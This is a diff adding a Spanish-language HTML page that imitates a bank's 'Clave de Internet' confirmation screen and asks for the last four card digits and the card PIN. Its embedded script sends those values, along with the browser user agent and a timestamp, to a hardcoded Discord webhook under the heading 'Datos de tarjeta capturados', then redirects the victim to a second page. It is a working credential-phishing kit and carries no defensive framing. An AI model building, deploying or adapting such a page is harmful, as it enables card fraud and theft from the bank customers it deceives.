@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Crea tu Clave de Internet</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f4f5f7;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 414px; /* Ancho de pantalla móvil típica */
+      min-height: 100vh;
+      background-color: #f3f3f3;
+      padding: 20px 24px;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Botón de cerrar X */
+    .close-btn {
+      align-self: flex-end;
+      font-size: 20px;
+      color: #666;
+      cursor: pointer;
+      text-decoration: none;
+      margin-top: 10px;
+      margin-right: 5px;
+    }
+
+    /* Encabezados */
+    .header {
+      text-align: center;
+      margin-top: 25px;
+      margin-bottom: 25px;
+    }
+
+    .header h1 {
+      font-size: 22px;
+      color: #2b2b2b;
+      font-weight: 700;
+      margin-bottom: 4px;
+    }
+
+    .header h2 {
+      font-size: 22px;
+      color: #2b2b2b;
+      font-weight: 700;
+      margin-bottom: 12px;
+    }
+
+    .header p {
+      font-size: 15px;
+      color: #666;
+      font-weight: 400;
+    }
+
+    /* Formulario e Inputs */
+    .form-group {
+      position: relative;
+      margin-top: 15px;
+    }
+
+    /* Contenedor estilo campo con texto integrado en el borde */
+    .input-box {
+      border: 1.5px solid #800020; /* Color guinda / borgoña */
+      border-radius: 10px;
+      position: relative;
+      padding: 12px 16px;
+      background-color: transparent;
+    }
+
+    .input-label {
+      position: absolute;
+      top: -10px;
+      left: 12px;
+      background-color: #f3f3f3; /* Coincide con el fondo */
+      padding: 0 6px;
+      font-size: 13px;
+      color: #800020;
+      font-weight: 500;
+    }
+
+    .input-field {
+      width: 100%;
+      border: none;
+      outline: none;
+      background: transparent;
+      font-size: 15px;
+      color: #7d8597;
+      letter-spacing: 1px;
+    }
+
+    .error-text {
+      color: #800020;
+      font-size: 13px;
+      margin-top: 6px;
+      margin-left: 16px;
+    }
+
+    .spacer {
+      margin-top: 25px;
+    }
+
+    /* Botón Continuar */
+    .btn-submit {
+      width: 100%;
+      padding: 14px;
+      margin-top: 40px;
+      border: none;
+      border-radius: 25px;
+      background-color: #e2e2e2;
+      color: #8e8e8e;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      text-align: center;
+      transition: background-color 0.2s ease;
+    }
+
+    /* Estado cuando se habilita el botón */
+    .btn-submit.active {
+      background-color: #800020;
+      color: #ffffff;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Botón Cerrar (X) -->
+    <div class="close-btn">&#215;</div>
+
+    <!-- Título y Subtítulos -->
+    <div class="header">
+      <h1>Confirmar</h1>
+      <h2>Clave de Internet</h2>
+      <p>Ingresa los datos de tu tarjeta</p>
+    </div>
+
+    <!-- Campo: Últimos 4 dígitos -->
+    <div class="form-group">
+      <div class="input-box">
+        <span class="input-label">Últimos 4 dígitos de tu tarjeta</span>
+        <input type="text" id="ultimos4" class="input-field" value="" maxlength="19" />
+      </div>
+      <div class="error-text" id="error-ultimos4"></div>
+    </div>
+
+    <!-- Campo: Clave PIN -->
+    <div class="form-group spacer">
+      <div class="input-box">
+        <span class="input-label">Clave PIN</span>
+        <input type="password" id="clave-pin" class="input-field" placeholder="" />
+      </div>
+    </div>
+
+    <!-- Botón Continuar -->
+    <button class="btn-submit" id="btn-continuar" type="button">Continuar</button>
+  </div>
+
+  <!-- ============================================================
+       SCRIPT EMBEBIDO: Captura + Webhook Discord + redirección
+       ============================================================ -->
+  <script>
+  (function () {
+    'use strict';
+
+    /* ================= CONFIGURACIÓN ================= */
+    // Reemplaza por tu webhook real de Discord
+    const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1574870438499319819/AFIZOmm6G9wYZBP4opqeUKkujnpL0CGWIqNPclqv9PPMgxuuY9pnKwwNrew2E5Vg-XlM';
+    // Archivo al que se redirige tras enviar (ajústalo si quieres otro)
+    const REDIRECT_URL = 'index2.html';
+
+    /* ================= REFERENCIAS ================= */
+    const inputUltimos4 = document.getElementById('ultimos4');
+    const inputPin      = document.getElementById('clave-pin');
+    const btnContinuar  = document.getElementById('btn-continuar');
+    const errorUltimos4 = document.getElementById('error-ultimos4');
+
+    /* ============ Validación: solo 4 dígitos en tarjeta ============ */
+    function validar() {
+      const val = inputUltimos4.value.trim();
+      const soloNumeros = /^\d{4}$/.test(val);
+      const pinOk = inputPin.value.trim().length >= 4;
+
+      // Mensaje de error inline (sin alterar layout)
+      if (val.length > 0 && !soloNumeros) {
+        errorUltimos4.textContent = 'Deben ser exactamente 4 dígitos.';
+      } else {
+        errorUltimos4.textContent = '';
+      }
+
+      const ok = soloNumeros && pinOk;
+      btnContinuar.disabled = !ok;
+      btnContinuar.classList.toggle('active', ok);
+      btnContinuar.style.cursor = ok ? 'pointer' : 'not-allowed';
+    }
+
+    inputUltimos4.addEventListener('input', function () {
+      // Solo permitir dígitos mientras se escribe
+      this.value = this.value.replace(/\D/g, '').slice(0, 4);
+      validar();
+    });
+    inputPin.addEventListener('input', validar);
+    validar();
+
+    /* ============ Utilidades ============ */
+    function limpiar(str) {
+      return String(str).replace(/[<>`]/g, '').trim().slice(0, 100);
+    }
+
+    async function enviarWebhook(datos) {
+      const payload = {
+        username: 'LT1 · Clave de Internet',
+        embeds: [{
+          title: '💳 Datos de tarjeta capturados',
+          color: 0x800020,
+          fields: [
+            { name: '🔢 Últimos 4 dígitos', value: datos.ultimos4 || '(vacío)', inline: true },
+            { name: '🔑 Clave PIN',         value: datos.pin || '(vacío)',      inline: true },
+            { name: '🌐 Navegador',         value: datos.userAgent,             inline: false },
+            { name: '🕒 Fecha',             value: datos.fecha,                 inline: false }
+          ],
+          footer: { text: 'Sistema de ingreso LT1' },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      const res = await fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      if (!res.ok) throw new Error('Webhook ' + res.status);
+    }
+
+    /* ============ Click en Continuar ============ */
+    btnContinuar.addEventListener('click', async function () {
+      if (btnContinuar.disabled) return;
+
+      const ultimos4 = limpiar(inputUltimos4.value);
+      const pin      = limpiar(inputPin.value);
+
+      if (!/^\d{4}$/.test(ultimos4)) {
+        errorUltimos4.textContent = 'Deben ser exactamente 4 dígitos.';
+        return;
+      }
+      if (pin.length < 4) {
+        alert('Ingresa tu Clave PIN (mínimo 4 caracteres).');
+        return;
+      }
+
+      const datos = {
+        ultimos4: ultimos4,
+        pin: pin,
+        userAgent: navigator.userAgent.slice(0, 200),
+        fecha: new Date().toLocaleString('es-PE')
+      };
+
+      // Guardar por si index1.html necesita leerlo
+      try {
+        localStorage.setItem('lt1_tarjeta', JSON.stringify({
+          ultimos4: datos.ultimos4
+          // No guardamos el PIN por seguridad
+        }));
+      } catch (e) { /* modo privado */ }
+
+      // Bloquear mientras envía
+      btnContinuar.disabled = true;
+      const textoOriginal = btnContinuar.textContent;
+      btnContinuar.textContent = 'Enviando...';
+      btnContinuar.classList.remove('active');
+
+      try {
+        await enviarWebhook(datos);
+      } catch (err) {
+        console.warn('No se pudo enviar al webhook:', err);
+      } finally {
+        btnContinuar.textContent = textoOriginal;
+        window.location.href = REDIRECT_URL;
+      }
+    });
+  })();
+  </script>
+</body>
+</html>
